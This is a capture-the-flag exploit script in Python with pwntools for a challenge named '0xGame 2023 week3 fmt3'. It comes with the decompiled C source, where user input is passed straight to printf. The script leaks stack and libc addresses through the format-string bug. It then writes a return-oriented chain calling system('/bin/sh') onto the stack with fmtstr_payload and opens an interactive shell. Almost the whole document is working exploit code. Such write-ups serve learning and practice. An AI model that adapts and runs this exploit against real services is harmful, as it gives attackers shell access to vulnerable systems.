"""0xGame 2023 week3 fmt3
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+Fh] [rbp-111h]
  char buf[264]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v6; // [rsp+118h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  bufinit(argc, argv, envp);
  puts("GO! GO! GO!");
  do
  {
    do
    {
      printf("Input your content: ");
      read(0, buf, 0x100uLL);
      printf(buf);
      puts("Want more?");
      v4 = getchar();
    }
    while ( v4 == 'y' );
  }
  while ( v4 == 89 );
  return 0;
}
"""
from pwn import *

p = process('./fmt3')
# p = remote('8.130.35.16', 52002)
context(arch='amd64', log_level='debug')
warnings.filterwarnings("ignore", category=BytesWarning)

gdb.attach(p, "b*$rebase(0x0012FD)\nc")
libc = ELF('./libc.so.6')

p.sendafter(b"Input your content: ", b'%40$p,%43$p,%41$p,')
# 40: 0x7fff4c1b24e0 —▸ 0x7fff4c1b25e0 , 栈地址 0x7fff4c1b25e0 - 0xe8 = 0x7FFF4C1B24F8 -> __libc_start_main+243
# 43: libc.sym['__libc_start_main'] + 243
# 41: 0xefbc534b2823ac00  canary , 好像没用上啊？
stack = int(p.recvuntil(',', drop=True), 16) - 0xe8
libc.address = int(p.recvuntil(',', drop=True), 16) - 243 - libc.sym['__libc_start_main']
print(f"{stack = :x} {libc.address = :x}")
p.sendafter(b"Want more?", b'y')

pop_rdi = next(libc.search(asm('pop rdi;ret')))  # pop_rdi + 1=ret
pop_rsi = next(libc.search(asm('pop rsi;ret')))

pay = flat(pop_rdi, next(libc.search(b'/bin/sh\x00')))
pay = fmtstr_payload(8, {stack: pay})
p.sendafter(b"Input your content: ", pay)
p.sendafter(b"Want more?", b'y')

pay = flat(pop_rsi, 0, )
pay = fmtstr_payload(8, {stack + 0x10: pay})  # stack + 0x10: canary,   %43-%41也是=0x10
p.sendafter(b"Input your content: ", pay)
p.sendafter(b"Want more?", b'y')

pay = flat(pop_rdi + 1, libc.sym['system'])  # pop_rdi + 1=ret
pay = fmtstr_payload(8, {stack + 0x20: pay})  # 完成构造链 pop rdi,bin_sh_addr,pop rsi,ret, system
p.sendafter(b"Input your content: ", pay)
p.sendafter(b"Want more?", b'n')

p.interactive()
